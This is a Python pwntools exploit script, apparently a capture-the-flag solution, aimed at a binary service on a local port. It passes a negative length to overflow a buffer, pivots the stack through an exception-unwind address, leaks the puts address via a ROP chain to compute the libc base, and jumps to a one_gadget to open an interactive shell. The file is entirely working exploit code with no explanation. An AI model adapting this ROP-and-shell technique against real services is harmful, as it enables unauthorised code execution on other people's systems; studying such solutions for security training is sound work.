#!/usr/bin/env python

from pwn import *

io = remote('127.0.0.1', 10001)
libc = ELF('/usr/lib/libc-2.26.so')

io.recvuntil("option:\n")
io.sendline("1")
io.recvuntil("(yes/No)")
io.sendline("No")
io.recvuntil("(yes/No)")
io.sendline("yes")
io.recvuntil("length:")
io.sendline('-3')
io.recvuntil("charset:")

puts_plt = 0x00400bD0
puts_got = 0x00606020
read_f1e = 0x00400f1e
pop_rdi = 0x004044d3        # pop rdi ; ret
pop_rsi_r15 = 0x004044d1    # pop rsi ; pop r15 ; ret

pivote_addr = 0x6061C0
unwind_addr = 0x00401509    # make sure unwind can find the catch routine

# stack pivot
payload_1  = "AAAAAAAA" * 36
payload_1 += p64(pivote_addr)
payload_1 += p64(unwind_addr)

io.sendline(payload_1)
io.recvuntil("\n")

# get puts address
payload_2  = "AAAAAAAA"     # fake ebp
payload_2 += p64(pop_rdi)
payload_2 += p64(puts_got)
payload_2 += p64(puts_plt)
payload_2 += p64(pop_rdi)
payload_2 += p64(pivote_addr + 0x50)
payload_2 += p64(pop_rsi_r15)
payload_2 += p64(8)
payload_2 += "AAAAAAAA"
payload_2 += p64(read_f1e)

io.sendline(payload_2)
io.recvuntil("pattern:\n")
puts_addr = io.recvuntil("\n")[:-1].ljust(8,"\x00")
puts_addr = u64(puts_addr)

libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x00041ee7

# get shell
payload_3 = p64(one_gadget)

io.sendline(payload_3)
io.interactive()
